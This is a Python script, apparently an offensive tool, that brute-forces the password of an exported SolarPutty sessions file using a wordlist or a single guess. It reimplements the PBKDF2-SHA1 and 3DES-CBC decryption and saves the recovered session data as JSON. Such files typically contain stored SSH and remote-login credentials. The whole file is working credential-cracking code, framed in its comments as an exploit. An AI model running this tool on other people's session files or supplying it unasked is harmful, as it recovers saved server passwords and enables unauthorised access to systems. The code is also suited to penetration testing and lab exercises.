#Written by Watchmakerr

#Unless you don't like it

#Inspired by VoidSec

#But written in python because who wants an entire visual studio project for an exploit that takes a couple hundred lines of bloated python code

#Microsoft? More like garbage

#Haha..

#(Cries in unemployed)


import os
import base64
import hashlib
import json
import sys
import time
import threading
import signal

from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad
from Crypto.Cipher.DES3 import adjust_key_parity

def main():
    print("   ____       __             ___         __   __          _____                 __            ")
    print("  / __/___   / /___ _ ____  / _ \\ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____")
    print(" _\\ \\ / _ \\ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/")
    print("/___/ \\___//_/ \\_,_//_/   /_/    \\_,_/ \\__/ \\__/ \\_, /  \\___//_/   \\_,_/ \\__//_/\\_\\ \\__//_/   ")
    print("                                                /___/                                         ")

    import argparse
    parser = argparse.ArgumentParser(description="Decrypt SolarPutty sessions file.")
    parser.add_argument('sessions_file', help='Path to the SolarPutty sessions file')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-p', '--password', help='Password to use for decryption')
    group.add_argument('-w', '--wordlist', help='Path to the password wordlist file')

    parser.add_argument('-v', '--verbose', nargs='?', const=True, default=False, help='Enable Verbosity')
    parser.add_argument('-o', '--output', default='SolarPutty_sessions_decrypted.txt', help='Output file to save the decrypted data')

    args = parser.parse_args()

    if str(args.verbose).lower() == 'false':
        args.verbose = False

    sessions_file = args.sessions_file

    if not os.path.exists(sessions_file):
        print(f"Sessions file not found: {sessions_file}")
        sys.exit(1)

    with open(sessions_file, 'r') as f:
        cipherText = f.read().strip()

    # Signal handler setup for both verbose and non-verbose modes
    stop_event = None
    spinner_thread = None
    signal.signal(signal.SIGINT, lambda signum, frame: handle_exit(signum, frame, stop_event, spinner_thread))

    if args.password:
        password = args.password.strip()
        print(f"Trying to decrypt using password: {password}")
        decrypted_data = Decrypt(password, cipherText, args.verbose)
        if decrypted_data:
            try:
                obj = json.loads(decrypted_data)
                print(f"Decryption successful using password: {password}")
                with open(args.output, 'w') as outputFile:
                    json.dump(obj, outputFile, indent=4)
                print(f"[+] DONE Decrypted file is saved in: {args.output}")
                sys.exit(0)
            except json.JSONDecodeError:
                print("Failed to parse decrypted data as JSON.")
        else:
            print("Decryption failed with the provided password.")
        sys.exit(1)

    if args.wordlist:
        password_file = args.wordlist
        if not os.path.exists(password_file):
            print(f"Password file not found: {password_file}")
            sys.exit(1)

        try:
            with open(password_file, 'r', encoding='latin-1') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError as e:
            print(f"Error reading password file: {e}")
            sys.exit(1)

        total_passwords = len(passwords)
        print("Trying to decrypt using passwords from wordlist...")

        if not args.verbose:
            stop_event, spinner_thread, progress = manage_spinner(total_passwords, start=True)

        for index, password in enumerate(passwords, start=1):
            if not args.verbose:
                progress[0] = index  # Update progress in real-time
            decrypted_data = Decrypt(password, cipherText, args.verbose)
            if decrypted_data:
                try:
                    obj = json.loads(decrypted_data)
                    if not args.verbose:
                        manage_spinner(stop_event=stop_event, spinner_thread=spinner_thread)
                    print(f"Decryption successful using password: {password}")
                    with open(args.output, 'w') as outputFile:
                        json.dump(obj, outputFile, indent=4)
                    print(f"[+] DONE Decrypted file is saved in: {args.output}")
                    sys.exit(0)
                except json.JSONDecodeError:
                    pass

        if not args.verbose:
            manage_spinner(stop_event=stop_event, spinner_thread=spinner_thread)
        print("Failed to decrypt sessions file with provided passwords.")
        sys.exit(1)

def Decrypt(passPhrase, cipherText, verbose):
    try:
        data = base64.b64decode(cipherText)
        salt = data[:24]
        rgbIV = data[24:48]
        encrypted_data = data[48:]
        key = hashlib.pbkdf2_hmac('sha1', passPhrase.encode('utf-8'), salt, 1000, dklen=24)
        key = adjust_key_parity(key)
        iv = rgbIV[:8]
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(encrypted_data)
        decrypted_data = unpad(decrypted_data, DES3.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        if verbose:
            if str(e) == "Padding is incorrect.":
                print(f"Testing password '{passPhrase}': Incorrect")
            else:
                print(f"Error in Decrypt with password '{passPhrase}': {e}")
        return None

def spinner(stop_event, total_passwords, progress):
    while not stop_event.is_set():
        for cursor in '|/-\\':
            sys.stdout.write(f'\rTrying passwords... {cursor} {progress[0]}/{total_passwords}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r')

def manage_spinner(total_passwords=None, stop_event=None, spinner_thread=None, progress=None, start=False):
    if start:
        stop_event = threading.Event()
        progress = [0]
        spinner_thread = threading.Thread(target=spinner, args=(stop_event, total_passwords, progress))
        spinner_thread.start()
        return stop_event, spinner_thread, progress
    else:
        stop_event.set()
        spinner_thread.join()
        sys.stdout.write('\r')
        sys.stdout.flush()

def handle_exit(signum, frame, stop_event=None, spinner_thread=None):
    print("\nExiting gracefully...")
    if stop_event and spinner_thread:
        stop_event.set()
        spinner_thread.join()
    sys.exit(0)

if __name__ == '__main__':
    main()
